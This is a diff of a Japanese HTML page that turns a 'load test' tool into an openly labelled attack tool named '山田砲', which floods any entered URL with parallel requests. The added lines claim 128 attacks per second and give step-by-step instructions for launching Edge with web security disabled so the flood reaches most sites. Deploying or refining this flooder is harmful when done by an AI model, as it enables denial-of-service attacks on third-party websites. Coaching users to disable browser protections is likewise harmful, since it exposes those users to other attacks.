@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>無限負荷テストツール</title>
+    <title>山田砲</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -12,11 +12,11 @@
     </style>
 </head>
 <body>
-    <h1>無限負荷テストツール</h1>
-    <label for="url">テストするURL:</label>
+    <h1>山田砲</h1>
+    <label for="url">攻撃するURL:</label>
     <input type="text" id="url" required>
-    <button id="startTest">テスト開始</button>
-    <button id="stopTest">テスト停止</button>
+    <button id="startTest">攻撃開始</button>
+    <button id="stopTest">攻撃停止</button>
     <p id="status"></p>
 
     <script>
@@ -25,7 +25,7 @@
         document.getElementById('startTest').addEventListener('click', async function() {
             const url = document.getElementById('url').value;
             const status = document.getElementById('status');
-            status.textContent = 'テストを実行中...';
+            status.textContent = '攻撃を実行中...';
             isTesting = true;
 
             async function sendRequest() {
@@ -43,7 +43,7 @@
             }
 
             // リクエストを並行して送信
-            const requestCount = 15; // 同時に送信するリクエストの数
+            const requestCount = 10; // 同時に送信するリクエストの数
             for (let i = 0; i < requestCount; i++) {
                 sendRequest(); // 非同期リクエストを開始
             }
@@ -51,7 +51,7 @@
 
         document.getElementById('stopTest').addEventListener('click', function() {
             isTesting = false;
-            document.getElementById('status').textContent = 'テストが停止しました。';
+            document.getElementById('status').textContent = '攻撃が停止しました。';
         });
 
         function generateRandomString(length = 10) {
@@ -63,5 +63,15 @@
             return result;
         }
     </script>
+   
+    <p>一秒で128回攻撃できます</p>
+    <p>これもそのままではほとんどのサイトが攻撃できないので</p>
+    <p>1. Windows(のマーク)キー+Rキーを同時押しする。</p>
+    <p>2. cmdと入力して検索する。</p>
+    <p>3. コマンドプロンプトが開く。下記のコードをコピペして実行する。</p>
+<pre id="commandtext">
+    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --disable-web-security --user-data-dir="C:\Windows\Temp" https://yamadahou.onrender.com/
+    
+</pre>
 </body>
 </html>
